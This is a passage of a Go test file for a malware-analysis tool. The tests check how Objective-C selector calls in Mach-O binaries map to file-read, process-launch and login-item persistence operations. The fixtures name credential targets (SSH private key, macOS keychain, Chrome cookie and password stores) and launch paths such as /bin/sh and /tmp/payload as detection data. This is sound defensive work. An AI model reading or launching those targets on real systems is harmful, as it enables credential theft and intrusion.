		0x2000: "dataWithContentsOfFile:",
	}, 0x1004, 0x2000, "arm64", machoCallContext{Argument0String: path}) {
		t.Fatal("expected called selector to be retained")
	}

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileRead || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("raw C-string evidence cannot prove an NSString input path: %#v", graph.Operations)
	}
	if len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("unresolved file read should retain only selector-call evidence: %#v", graph.Operations[0])
	}
}

func TestObjCMessageStubCallDoesNotBindResourceToNoArgumentSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "collect", Start: 0x1000, End: 0x1040, Reachable: true}
	const path = "~/.ssh/id_rsa"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "sensitive-resource",
			Value:    path,
			Resource: behavior.NewResource(behavior.ResourceFile, path, behavior.ResourceClassSSHPrivateKey),
		},
	})
	if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{
		0x2000: "readDataToEndOfFile",
	}, 0x1004, 0x2000, "arm64", machoCallContext{Argument0String: path}) {
		t.Fatal("expected called selector to be retained")
	}

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileRead || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("no-argument selector must leave the file resource unresolved with call-only evidence: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallDoesNotPromoteNearFileWriteSelectors(t *testing.T) {
	for _, selector := range []string{
		"writeToFile:",
		"writeToFileIfNeeded:atomically:",
		"writeToURL:atomically:",
		"WriteToFile:atomically:",
	} {
		t.Run(selector, func(t *testing.T) {
			var graph behavior.Graph
			if !addObjCMessageStubCall(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "sample"}, []machoFunction{{Name: "save", Start: 0x1000, End: 0x1020}}, map[uint64]string{0x2000: selector}, 0x1004, 0x2000, "arm64") {
				t.Fatal("expected called selector to be retained")
			}
			if len(graph.Operations) != 0 || !featureHasValue(graph.Features, "objc.message_call", selector) {
				t.Fatalf("near selector should remain a neutral call feature: features=%#v operations=%#v", graph.Features, graph.Operations)
			}
		})
	}
}

func TestObjCMessageStubCallDoesNotGuessSensitiveResourceFromSameFunctionXref(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID: "node-1", LogicalPath: "sample",
		ExecutionConnectivity: string(behavior.ConnectivityConnected), ExecutionRootIDs: []string{"root-1"},
	}
	functions := []machoFunction{{Name: "collect", Start: 0x1000, End: 0x1020, Reachable: true}}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "sensitive-resource",
			Value:    "~/Library/Keychains/login.keychain-db",
			Resource: behavior.Resource{Kind: behavior.ResourceCredentialStore, Value: "~/Library/Keychains/login.keychain-db", Classifications: []behavior.ResourceClassification{behavior.ResourceClassKeychain}},
		},
	})
	ok := addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "dataWithContentsOfFile:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != behavior.ResourceFile || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("file-read selector must not guess a resource from same-function co-occurrence: %#v", graph.Operations)
	}
	if len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("file-read selector operation should retain only its call evidence without argument proof: %#v", graph.Operations[0])
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("same-function operation lost connected ownership: %#v", graph.Operations[0])
	}
	for _, feature := range graph.Features {
		if feature.Key == "macho.sensitive_resource" {
			if feature.Execution.Connectivity != behavior.ConnectivityConnected || !slices.Equal(feature.Execution.ExecutionRootIDs, []string{"root-1"}) {
				t.Fatalf("sensitive-resource xref lost connected function ownership: %#v", feature)
			}
			return
		}
	}
	t.Fatalf("missing sensitive-resource xref feature: %#v", graph.Features)
}

func TestObjCMessageStubCallIgnoresSensitiveResourceXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{
		{Name: "other", Start: 0x1000, End: 0x1020, Reachable: true},
		{Name: "collect", Start: 0x1100, End: 0x1120, Reachable: true},
	}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "sensitive-resource",
			Value:    "~/.ssh/id_rsa",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "~/.ssh/id_rsa", Classifications: []behavior.ResourceClassification{behavior.ResourceClassSSHPrivateKey}},
		},
	})
	addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "stringWithContentsOfFile:encoding:error:",
	}, 0x1104, 0x2000, "arm64")

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != "file" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("file-read selector should not use resource xref from another function: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallLeavesMultipleSensitiveResourceXrefsUnresolved(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "collect", Start: 0x1000, End: 0x1020, Reachable: true}}
	for i, resource := range []behavior.Resource{
		behavior.NewResource(behavior.ResourceFile, "~/Library/Application Support/Google/Chrome/Default/Cookies", behavior.ResourceClassBrowserCookieStore),
		behavior.NewResource(behavior.ResourceFile, "~/Library/Application Support/Google/Chrome/Default/Login Data", behavior.ResourceClassBrowserPasswordStore),
	} {
		addMachOStringXref(&graph, content, "arm64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: functions[0],
			Literal: machoStringLiteral{
				VA:       0x3000 + uint64(i),
				Offset:   80 + i,
				Kind:     "sensitive-resource",
				Value:    resource.Value,
				Resource: resource,
			},
		})
	}
	addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "dataWithContentsOfFile:",
	}, 0x1004, 0x2000, "arm64")

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != "file" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("multiple resource xrefs should leave file-read selector generic: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallDoesNotTreatFileExistenceAsRead(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "collect", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{
		0x2000: "fileExistsAtPath:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileMetadataQuery || graph.Operations[0].RequiredResource().Value != "" || graph.Operations[0].Support != behavior.SupportHeuristic {
		t.Fatalf("file existence check should be a neutral unresolved metadata query, not a read: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallAddsProcessOperationForTaskLaunchSelector(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "runHelper", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{
		0x2000: "launchedTaskWithLaunchPath:arguments:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "process.execute" || graph.Operations[0].RequiredResource().Kind != behavior.ResourceFile {
		t.Fatalf("missing process execution operation: %#v", graph.Operations)
	}
	if graph.Operations[0].SourceFunction != "runHelper" || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("process selector should preserve its function without inventing a root: %#v", graph.Operations[0])
	}
}

func TestObjCMessageStubCallDoesNotBindProcessPathFromRawCStringEvidence(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runHelper", Start: 0x1000, End: 0x1040, Reachable: true}
	const path = "/usr/bin/curl"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    path,
			Resource: behavior.NewResource(behavior.ResourceFile, path),
		},
	})
	if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{
		0x2000: "launchedTaskWithLaunchPath:arguments:",
	}, 0x1004, 0x2000, "arm64", machoCallContext{Argument0String: path}) {
		t.Fatal("expected called selector to be retained")
	}

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("raw C-string evidence cannot prove an NSString launch path: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallDoesNotBindProcessPathFromObjectOrOutParameter(t *testing.T) {
	selectors := []string{
		"launchAndReturnError:",
		"launchedTaskWithExecutableURL:arguments:error:terminationHandler:",
		"openApplicationAtURL:configuration:completionHandler:",
	}
	for _, selector := range selectors {
		t.Run(selector, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			function := machoFunction{Name: "runHelper", Start: 0x1000, End: 0x1040, Reachable: true}
			const path = "/usr/bin/curl"
			addMachOStringXref(&graph, content, "arm64", machoStringXref{
				RefVA:    0x1000,
				Function: function,
				Literal: machoStringLiteral{
					VA:       0x3000,
					Offset:   80,
					Kind:     "process-launch-path",
					Value:    path,
					Resource: behavior.NewResource(behavior.ResourceFile, path),
				},
			})
			if !addObjCMessageStubCallWithContext(&graph, content, []machoFunction{function}, map[uint64]string{
				0x2000: selector,
			}, 0x1004, 0x2000, "arm64", machoCallContext{Argument0String: path}) {
				t.Fatal("expected called selector to be retained")
			}

			if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
				t.Fatalf("object/out-parameter selector must leave its executable unresolved with call-only evidence: %#v", graph.Operations)
			}
		})
	}
}

func TestObjCMessageCallsCorrelateNSTaskConfigurationAndLaunch(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "profileHost", Start: 0x1000, End: 0x1100, Reachable: true}}

	addObjCMessageCall(&graph, content, functions, "setLaunchPath:", "objc-msgsend-stub", 0x1010, "arm64", machoCallContext{})
	addObjCMessageCall(&graph, content, functions, "setArguments:", "objc-msgsend-stub", 0x1020, "arm64", machoCallContext{})
	if len(graph.Operations) != 0 {
		t.Fatalf("configuring an NSTask without launch should not create an operation: %#v", graph.Operations)
	}
	addObjCMessageCall(&graph, content, functions, "launch", "objc-msgsend-stub", 0x1030, "arm64", machoCallContext{})

	if len(graph.Operations) != 1 {
		t.Fatalf("setLaunchPath plus launch should create exactly one process operation: %#v", graph.Operations)
	}
	operation := graph.Operations[0]
	if operation.Kind != "process.execute" || operation.RequiredResource().Kind != behavior.ResourceFile || operation.RequiredResource().Value != "" || operation.Qualifiers["api"] != "NSTask" {
		t.Fatalf("unexpected NSTask-correlated operation: %#v", operation)
	}
	if operation.SourceFunction != "profileHost" || operation.Execution.Connectivity != behavior.ConnectivityUnknown || operation.Support != behavior.SupportHeuristic || len(operation.EvidenceIDs) != 3 {
		t.Fatalf("NSTask operation should retain bounded same-function selector evidence: %#v", operation)
	}
	if operation.Qualifiers["receiver_identity"] != "unresolved" || operation.Qualifiers["resource_binding"] != "unresolved" || operation.Qualifiers["semantic_basis"] != "ordered-selector-set" {
		t.Fatalf("NSTask correlation must disclose unresolved receiver/resource proof: %#v", operation.Qualifiers)
	}
}

func TestNSTaskCorrelationRequiresConfigurationBeforeLaunch(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "profileHost", Start: 0x1000, End: 0x1100, Reachable: true}}

	addObjCMessageCall(&graph, content, functions, "launch", "objc-msgsend-stub", 0x1010, "arm64", machoCallContext{})
	addObjCMessageCall(&graph, content, functions, "setLaunchPath:", "objc-msgsend-stub", 0x1020, "arm64", machoCallContext{})
	if len(graph.Operations) != 0 {
		t.Fatalf("a launch preceding configuration must not be retroactively correlated: %#v", graph.Operations)
	}
}

func TestNSTaskCorrelationBoundsRepeatedSelectorEvidence(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "profileHost", Reachable: true}
	scopeID := graph.AddScope(behavior.Scope{NodeID: content.NodeID, Kind: "function", Function: function.Name, Architecture: "arm64"})
	for i := 0; i < maxMachOCorrelatedOperationEvidence*4; i++ {
		graph.AddFeature(behavior.Feature{
			NodeID:         content.NodeID,
			ScopeID:        scopeID,
			Architecture:   "arm64",
			Key:            "objc.message_call",
			Value:          "setLaunchPath:",
			EvidenceIDs:    []string{fmt.Sprintf("ev-path-%03d", i)},
			Support:        behavior.SupportCorroborated,
			SourceFunction: function.Name,
		})
	}
	graph.AddFeature(behavior.Feature{
		NodeID:         content.NodeID,
		ScopeID:        scopeID,
		Architecture:   "arm64",
		Key:            "objc.message_call",
		Value:          "launch",
		EvidenceIDs:    []string{"ev-launch"},
		Support:        behavior.SupportCorroborated,
		SourceFunction: function.Name,
	})
	graph.AddFeature(behavior.Feature{
		NodeID:         content.NodeID,
		ScopeID:        scopeID,
		Architecture:   "arm64",
		Key:            "macho.process_launch_path",
		Value:          "/usr/sbin/system_profiler",
		EvidenceIDs:    []string{"ev-concrete-path"},
		Support:        behavior.SupportCorroborated,
		SourceFunction: function.Name,
	})

	addOperationFromNSTaskSelectorSetIndexed(newMachOCallLookup(&graph, content, "arm64"), function, "launch")
	if len(graph.Operations) != 1 || len(graph.Operations[0].EvidenceIDs) != maxMachOCorrelatedOperationEvidence {
		t.Fatalf("NSTask selector evidence should be capped at %d: %#v", maxMachOCorrelatedOperationEvidence, graph.Operations)
	}
	if !stringSliceContains(graph.Operations[0].EvidenceIDs, "ev-launch") {
		t.Fatalf("bounded NSTask evidence must retain the required launch proof: %#v", graph.Operations[0].EvidenceIDs)
	}
	if graph.Operations[0].RequiredResource().Value != "" || stringSliceContains(graph.Operations[0].EvidenceIDs, "ev-concrete-path") {
		t.Fatalf("same-function path co-occurrence must not bind an NSTask executable: %#v", graph.Operations[0])
	}
}

func TestObjCMessageStubCallDoesNotGuessProcessPathFromSameFunctionXref(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "runHelper", Start: 0x1000, End: 0x1020, Reachable: true}}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    "/usr/bin/curl",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "/usr/bin/curl"},
		},
	})
	ok := addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "launchedTaskWithLaunchPath:arguments:",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != behavior.ResourceFile || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("process operation must not guess its executable from same-function co-occurrence: %#v", graph.Operations)
	}
	if len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("process operation should retain only its call evidence without argument proof: %#v", graph.Operations[0])
	}
}

func TestObjCMessageStubCallIgnoresProcessPathXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{
		{Name: "other", Start: 0x1000, End: 0x1020, Reachable: true},
		{Name: "runHelper", Start: 0x1100, End: 0x1120, Reachable: true},
	}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x1000,
		Function: functions[0],
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "process-launch-path",
			Value:    "/usr/bin/curl",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "/usr/bin/curl"},
		},
	})
	addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "launchedTaskWithLaunchPath:arguments:",
	}, 0x1104, 0x2000, "arm64")

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("process operation should not use process path xref from another function: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallLeavesMultipleProcessPathXrefsUnresolved(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "runHelper", Start: 0x1000, End: 0x1020, Reachable: true}}
	for i, value := range []string{"/bin/sh", "/tmp/payload"} {
		addMachOStringXref(&graph, content, "arm64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: functions[0],
			Literal: machoStringLiteral{
				VA:       0x3000 + uint64(i),
				Offset:   80 + i,
				Kind:     "process-launch-path",
				Value:    value,
				Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: value},
			},
		})
	}
	addObjCMessageStubCall(&graph, content, functions, map[uint64]string{
		0x2000: "launchedTaskWithLaunchPath:arguments:",
	}, 0x1004, 0x2000, "arm64")

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("multiple process path xrefs should remain unresolved: %#v", graph.Operations)
	}
}

func TestObjCMessageStubCallDoesNotTreatGenericLaunchAsProcessOperation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	ok := addObjCMessageStubCall(&graph, content, []machoFunction{{Name: "maybeUI", Start: 0x1000, End: 0x1020, Reachable: true}}, map[uint64]string{
		0x2000: "launch",
	}, 0x1004, 0x2000, "arm64")

	if !ok {
		t.Fatal("expected ObjC message stub call to be recognized")
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("generic launch selector should remain a feature, not an operation: %#v", graph.Operations)
	}
}

func TestObjCSMAppServiceLoginItemRequiresFactoryAndRegisterInSameFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "install", Start: 0x1000, End: 0x1040, Reachable: true}}
	stubs := map[uint64]string{
		0x2000: "loginItemServiceWithIdentifier:",
		0x2010: "registerAndReturnError:",
	}
	if !addObjCMessageStubCall(&graph, content, functions, stubs, 0x1004, 0x2000, "arm64") {
		t.Fatal("expected service factory selector to be recognized")
	}
	if len(graph.Operations) != 0 {
		t.Fatalf("factory selector alone should not create an operation: %#v", graph.Operations)
	}
	if !addObjCMessageStubCall(&graph, content, functions, stubs, 0x1010, 0x2010, "arm64") {
		t.Fatal("expected register selector to be recognized")
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "login-item.register" || graph.Operations[0].RequiredResource().Kind != "login-item" {
		t.Fatalf("factory plus register should create login-item persistence operation: %#v", graph.Operations)
	}
	if graph.Operations[0].SourceFunction != "install" || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("SMAppService operation should preserve its function without inventing a root: %#v", graph.Operations[0])
	}
	if graph.Operations[0].Support != behavior.SupportHeuristic || graph.Operations[0].Qualifiers["receiver_identity"] != "unresolved" || graph.Operations[0].Qualifiers["semantic_basis"] != "ordered-selector-set" {
		t.Fatalf("SMAppService lifecycle inference must disclose its unresolved receiver/control flow: %#v", graph.Operations[0])
	}
	if len(graph.Operations[0].EvidenceIDs) != 2 {
		t.Fatalf("SMAppService operation should include factory and register evidence: %#v", graph.Operations[0])
	}
}

func TestObjCSMAppServiceRegisterBeforeFactoryDoesNotCreateOperation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	functions := []machoFunction{{Name: "install", Start: 0x1000, End: 0x1040, Reachable: true}}
	stubs := map[uint64]string{
		0x2000: "registerAndReturnError:",
		0x2010: "loginItemServiceWithIdentifier:",
	}
	addObjCMessageStubCall(&graph, content, functions, stubs, 0x1004, 0x2000, "arm64")
	addObjCMessageStubCall(&graph, content, functions, stubs, 0x1010, 0x2010, "arm64")

	if len(graph.Operations) != 0 {
		t.Fatalf("register before factory must not satisfy the SMAppService lifecycle: %#v", graph.Operations)
	}
	if !featureHasValue(graph.Features, "objc.message_call", "registerAndReturnError:") || !featureHasValue(graph.Features, "objc.message_call", "loginItemServiceWithIdentifier:") {
		t.Fatalf("neutral lifecycle call features should be retained: %#v", graph.Features)
	}
}

func TestObjCSMAppServiceFactoryKinds(t *testing.T) {
	tests := []struct {
		selector string
		kind     string
		category string
	}{
		{"mainAppService", "login-item.register", "login-item"},
		{"agentServiceWithPlistName:", "launchd.job.register", "launch-agent"},
		{"daemonServiceWithPlistName:", "launchd.job.register", "launch-daemon"},
	}
	for _, tt := range tests {
		t.Run(tt.selector, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			functions := []machoFunction{{Name: "install", Start: 0x1000, End: 0x1040, Reachable: true}}
			stubs := map[uint64]string{
				0x2000: tt.selector,
				0x2010: "registerAndReturnError:",
			}
			addObjCMessageStubCall(&graph, content, functions, stubs, 0x1004, 0x2000, "arm64")
			addObjCMessageStubCall(&graph, content, functions, stubs, 0x1010, 0x2010, "arm64")

			if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationKind(tt.kind) || testResourceCategory(graph.Operations[0].RequiredResource()) != tt.category {
				t.Fatalf("SMAppService selector %q mapped to unexpected operation: %#v", tt.selector, graph.Operations)
			}
		})
	}
}

func TestObjCSMAppServiceOperationDoesNotGuessResourceFromSameFunctionXref(t *testing.T) {
	tests := []struct {
		name     string
		selector string
		literal  string
		category string
	}{
		{"login item", "loginItemServiceWithIdentifier:", "com.example.helper", "login-item"},
		{"agent", "agentServiceWithPlistName:", "com.example.agent.plist", "launch-agent"},
		{"daemon", "daemonServiceWithPlistName:", "com.example.daemon.plist", "launch-daemon"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			functions := []machoFunction{{Name: "install", Start: 0x1000, End: 0x1040, Reachable: true}}
			lookup := newMachOCallLookup(&graph, content, "arm64")
			addMachOStringXrefIndexed(lookup, machoStringXref{
				RefVA:    0x1000,
				Function: functions[0],
				Literal: machoStringLiteral{
					VA:       0x3000,
					Offset:   80,
					Kind:     "service-management-resource",
					Value:    tt.literal,
					Resource: behavior.NewResource(behavior.ResourceIdentifier, tt.literal, serviceManagementResourceClassification(serviceManagementLiteralCategory(tt.literal))),
				},
			})
			if len(graph.Features) != 0 || len(graph.Evidence) != 0 || len(graph.Scopes) != 0 {
				t.Fatalf("uncorrelated ServiceManagement candidate should remain private: features=%#v evidence=%#v scopes=%#v", graph.Features, graph.Evidence, graph.Scopes)
			}
			stubs := map[uint64]string{
				0x2000: tt.selector,
				0x2010: "registerAndReturnError:",
			}
			addObjCMessageStubCallWithContextIndexed(lookup, functions, stubs, 0x1004, 0x2000, machoCallContext{})
			for _, feature := range graph.Features {
				if feature.Key == "macho.service_management_resource" {
					t.Fatalf("factory selector without register should not publish candidate: %#v", feature)
				}
			}
			addObjCMessageStubCallWithContextIndexed(lookup, functions, stubs, 0x1010, 0x2010, machoCallContext{})

			if len(graph.Operations) != 1 || testResourceCategory(graph.Operations[0].RequiredResource()) != tt.category || graph.Operations[0].RequiredResource().Value != "" {
				t.Fatalf("SMAppService operation must not guess a resource from same-function co-occurrence: %#v", graph.Operations)
			}
			if graph.Operations[0].Support != behavior.SupportHeuristic || graph.Operations[0].Qualifiers["receiver_identity"] != "unresolved" || graph.Operations[0].Qualifiers["resource_binding"] != "unresolved" {
				t.Fatalf("SMAppService correlation must disclose its unresolved receiver/resource proof: %#v", graph.Operations[0])
			}
			for _, feature := range graph.Features {
				if feature.Key == "macho.service_management_resource" {
					t.Fatalf("unproven concrete resource must remain private: %#v", feature)
				}
			}
			if len(graph.Operations[0].EvidenceIDs) != 2 {
				t.Fatalf("SMAppService operation should retain only factory/register evidence without argument proof: %#v", graph.Operations[0])
			}
		})
	}
}

func TestObjCServiceManagementDottedCandidateStaysPrivateWithoutFactoryRegisterCorrelation(t *testing.T) {
	const value = "runtime.SetFinalizer.func2"
	if !looksServiceManagementResource(value) {
		t.Fatalf("test requires %q to exercise the intentionally broad dotted-string candidate heuristic", value)
	}

	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runtime.SetFinalizer.func2", Start: 0x1000, End: 0x1040, Reachable: true}
	lookup := newMachOCallLookup(&graph, content, "x86_64")
	addMachOStringXrefIndexed(lookup, machoStringXref{
		RefVA:    0x1004,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "service-management-resource",
			Value:    value,
			Resource: behavior.NewResource(behavior.ResourceIdentifier, value, behavior.ResourceClassBundleIdentifier),
		},
	})
	if len(graph.Features) != 0 || len(graph.Evidence) != 0 || len(graph.Scopes) != 0 {
		t.Fatalf("dotted-string candidate leaked into the public graph: features=%#v evidence=%#v scopes=%#v", graph.Features, graph.Evidence, graph.Scopes)
	}

	stubs := map[uint64]string{0x2000: "registerAndReturnError:"}
	addObjCMessageStubCallWithContextIndexed(lookup, []machoFunction{function}, stubs, 0x1010, 0x2000, machoCallContext{})
	if len(graph.Operations) != 0 {
		t.Fatalf("register without an SMAppService factory should not create an operation: %#v", graph.Operations)
	}
	for _, feature := range graph.Features {
		if feature.Key == "macho.service_management_resource" {
			t.Fatalf("register-only correlation published dotted-string candidate: %#v", feature)
		}
	}
	for _, evidence := range graph.Evidence {
		if evidence.Kind == "service-management-resource-xref" {
			t.Fatalf("register-only correlation published dotted-string xref evidence: %#v", evidence)
		}
	}
}

func TestObjCSMAppServiceMainAppDoesNotBindDottedCandidate(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "install", Start: 0x1000, End: 0x1040, Reachable: true}
	lookup := newMachOCallLookup(&graph, content, "arm64")
	addMachOStringXrefIndexed(lookup, machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "service-management-resource",
			Value:    "com.example.unrelated",
			Resource: behavior.NewResource(behavior.ResourceIdentifier, "com.example.unrelated", behavior.ResourceClassBundleIdentifier),
		},
	})
	stubs := map[uint64]string{
		0x2000: "mainAppService",
		0x2010: "registerAndReturnError:",
	}
	addObjCMessageStubCallWithContextIndexed(lookup, []machoFunction{function}, stubs, 0x1004, 0x2000, machoCallContext{})
	addObjCMessageStubCallWithContextIndexed(lookup, []machoFunction{function}, stubs, 0x1010, 0x2010, machoCallContext{})

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != "login-item" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("mainAppService should identify the current app without binding an unrelated dotted string: %#v", graph.Operations)
	}
	for _, feature := range graph.Features {
		if feature.Key == "macho.service_management_resource" {
			t.Fatalf("mainAppService takes no identifier and should not publish a resource candidate: %#v", feature)
		}
	}
}

func TestObjCSMAppServiceDoesNotChooseAmongAmbiguousSameFunctionResources(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "install", Start: 0x1000, End: 0x1040, Reachable: true}
	lookup := newMachOCallLookup(&graph, content, "arm64")
	for index, value := range []string{"com.example.analytics", "com.example.helper"} {
		addMachOStringXrefIndexed(lookup, machoStringXref{
			RefVA:    uint64(0x1000 + index*4),
			Function: function,
			Literal: machoStringLiteral{
				VA:       uint64(0x3000 + index*0x20),
				Offset:   80 + index*32,
				Kind:     "service-management-resource",
				Value:    value,
				Resource: behavior.NewResource(behavior.ResourceIdentifier, value, behavior.ResourceClassBundleIdentifier),
			},
		})
	}
	stubs := map[uint64]string{
		0x2000: "loginItemServiceWithIdentifier:",
		0x2010: "registerAndReturnError:",
	}
	addObjCMessageStubCallWithContextIndexed(lookup, []machoFunction{function}, stubs, 0x1010, 0x2000, machoCallContext{})
	addObjCMessageStubCallWithContextIndexed(lookup, []machoFunction{function}, stubs, 0x1020, 0x2010, machoCallContext{})

	if len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Kind != "login-item" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("ambiguous resource candidates should leave the persistence target unresolved: %#v", graph.Operations)
	}
	for _, feature := range graph.Features {
		if feature.Key == "macho.service_management_resource" {
			t.Fatalf("ambiguous private candidate was published: %#v", feature)
